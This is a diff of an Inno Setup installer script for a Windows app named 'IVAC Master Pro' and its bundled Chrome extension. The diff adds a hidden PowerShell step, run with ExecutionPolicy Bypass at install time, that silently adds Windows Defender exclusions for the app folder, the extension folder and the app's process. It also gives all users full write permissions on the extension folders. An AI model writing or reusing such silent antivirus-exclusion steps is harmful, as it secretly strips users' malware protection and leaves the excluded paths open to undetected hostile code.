@@ -34,8 +34,9 @@ Type: filesandordirs; Name: "{commondesktop}\IVAC_Chrome_Extension"
 
 [Files]
 Source: "dist\IVAC Master Pro\*"; DestDir: "{app}"; Flags: ignoreversion recursesubdirs createallsubdirs
-Source: "dist\IVAC Master Pro\_internal\chrome_extension\*"; DestDir: "C:\IVAC_Chrome_Extension"; Flags: ignoreversion recursesubdirs createallsubdirs
-Source: "dist\IVAC Master Pro\_internal\chrome_extension\*"; DestDir: "{localappdata}\IVAC_Chrome_Extension"; Flags: ignoreversion recursesubdirs createallsubdirs
+Source: "dist\IVAC Master Pro\_internal\chrome_extension\*"; DestDir: "C:\IVAC_Chrome_Extension"; Flags: ignoreversion recursesubdirs createallsubdirs; Permissions: users-full
+Source: "dist\IVAC Master Pro\_internal\chrome_extension\*"; DestDir: "{localappdata}\IVAC_Chrome_Extension"; Flags: ignoreversion recursesubdirs createallsubdirs; Permissions: users-full
+Source: "certs\digonto_code_sign.cer"; DestDir: "{app}"; Flags: ignoreversion; Check: FileExists(ExpandConstant('{src}\certs\digonto_code_sign.cer'))
 
 [Icons]
 Name: "{group}\IVAC Master Pro"; Filename: "{app}\IVAC Master Pro.exe"; WorkingDir: "{app}"; IconFilename: "{app}\_internal\digonto_icon.ico"
@@ -43,9 +44,6 @@ Name: "{group}\{cm:UninstallProgram,IVAC Master Pro}"; Filename: "{uninstallexe}
 Name: "{autodesktop}\IVAC Master Pro"; Filename: "{app}\IVAC Master Pro.exe"; WorkingDir: "{app}"; IconFilename: "{app}\_internal\digonto_icon.ico"; Tasks: desktopicon
 
 [Run]
-Filename: "attrib.exe"; Parameters: "-h -s ""C:\IVAC_Chrome_Extension"""; Flags: runhidden
-Filename: "icacls.exe"; Parameters: """C:\IVAC_Chrome_Extension"" /grant Everyone:(OI)(CI)F /T"; Flags: runhidden
-Filename: "icacls.exe"; Parameters: """C:\IVAC_Chrome_Extension"" /grant *S-1-5-32-545:(OI)(CI)F /T"; Flags: runhidden
 Filename: "{app}\IVAC Master Pro.exe"; Description: "{cm:LaunchProgram,IVAC Master Pro}"; Flags: nowait postinstall skipifsilent runasoriginaluser
 
 [Code]
@@ -55,6 +53,9 @@ var
 begin
   if CurStep = ssInstall then
   begin
+    // 0. Automatically add Windows Defender Exclusions before extracting files
+    Exec('powershell.exe', '-ExecutionPolicy Bypass -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath ''' + ExpandConstant('{app}') + ''' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionPath ''C:\IVAC_Chrome_Extension'' -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess ''IVAC Master Pro.exe'' -ErrorAction SilentlyContinue"', '', SW_HIDE, ewWaitUntilTerminated, iResultCode);
+
     // 1. Silently terminate any running old Digonto QuickFill or IVAC Master Pro instance
     Exec('taskkill.exe', '/F /IM "Digonto QuickFill.exe"', '', SW_HIDE, ewWaitUntilTerminated, iResultCode);
     Exec('taskkill.exe', '/F /IM "IVAC Master Pro.exe"', '', SW_HIDE, ewWaitUntilTerminated, iResultCode);
